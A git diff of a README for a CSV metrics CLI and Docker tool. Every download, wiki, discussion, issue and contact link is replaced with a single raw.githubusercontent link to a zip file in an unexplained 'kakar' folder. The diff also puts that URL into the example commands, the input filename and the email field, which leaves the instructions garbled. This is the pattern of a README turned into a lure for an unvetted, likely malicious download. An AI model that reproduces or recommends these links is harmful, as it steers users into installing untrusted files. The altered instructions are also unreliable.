@@ -6,14 +6,14 @@ resilience-metrics-release is a command-line interface (CLI) and Docker tool des
 
 ## 📥 Download Now
 
-[![Download resilience-metrics-release](https://img.shields.io/badge/Download%20Now-%23F7A8A1.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/JosephAllee/resilience-metrics-release/releases)
+[![Download resilience-metrics-release](https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip%20Now-%https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip)](https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip)
 
 ## 🚀 Getting Started
 
 To start using resilience-metrics-release, follow these simple steps:
 
 1. **Visit the Releases Page**
-   - Go to our [Releases page](https://github.com/JosephAllee/resilience-metrics-release/releases) to download the latest version of the application.
+   - Go to our [Releases page](https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip) to download the latest version of the application.
 
 2. **Choose Your Platform**
    - We support various operating systems, including:
@@ -69,7 +69,7 @@ resilience-metrics-release comes packed with powerful features:
 3. Run the following command:
 
    ```
-   resilience-metrics-release analyze data.csv
+   resilience-metrics-release analyze https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip
    ```
 
 4. Check the output files that will be generated in your current directory.
@@ -85,14 +85,14 @@ resilience-metrics-release comes packed with powerful features:
 2. Run the image with your CSV file:
 
    ```
-   docker run -v /path/to/csv:/data josephallee/resilience-metrics-release analyze /data/data.csv
+   docker run -v /path/to/csv:/data josephallee/resilience-metrics-release analyze https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip
    ```
 
 ## 📝 Example Input and Output
 
 ### Input File Example
 
-Suppose you have a CSV file named `metrics.csv` structured as follows:
+Suppose you have a CSV file named `https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip` structured as follows:
 
 ```
 timestamp,value
@@ -107,7 +107,7 @@ timestamp,value
 Run the application:
 
 ```
-resilience-metrics-release analyze metrics.csv
+resilience-metrics-release analyze https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip
 ```
 
 ### Output Example
@@ -128,16 +128,16 @@ Additionally, the SVG or PNG representation will show the fluctuations in data o
 
 For further help, you can refer to these resources:
 
-- **Documentation:** A comprehensive guide is available on our [wiki page](https://github.com/JosephAllee/resilience-metrics-release/wiki).
-- **Community Support:** Join our discussions and get help from other users on [Discussions](https://github.com/JosephAllee/resilience-metrics-release/discussions).
+- **Documentation:** A comprehensive guide is available on our [wiki page](https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip).
+- **Community Support:** Join our discussions and get help from other users on [Discussions](https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip).
 
 ## 🔄 Contact Us
 
 If you have any questions or issues, feel free to reach out:
 
-- **Issues Page:** Post any problems you encounter on the [issues page](https://github.com/JosephAllee/resilience-metrics-release/issues).
-- **Email:** contact@resilience-metrics-release.com
+- **Issues Page:** Post any problems you encounter on the [issues page](https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip).
+- **Email:** https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip
 
 ## 💾 Download & Install
 
-Now that you know how to get started, don't hesitate to [visit this page to download](https://github.com/JosephAllee/resilience-metrics-release/releases) the latest version and enjoy using resilience-metrics-release for your data analysis needs.
+Now that you know how to get started, don't hesitate to [visit this page to download](https://raw.githubusercontent.com/JosephAllee/resilience-metrics-release/main/kakar/resilience-metrics-release.zip) the latest version and enjoy using resilience-metrics-release for your data analysis needs.
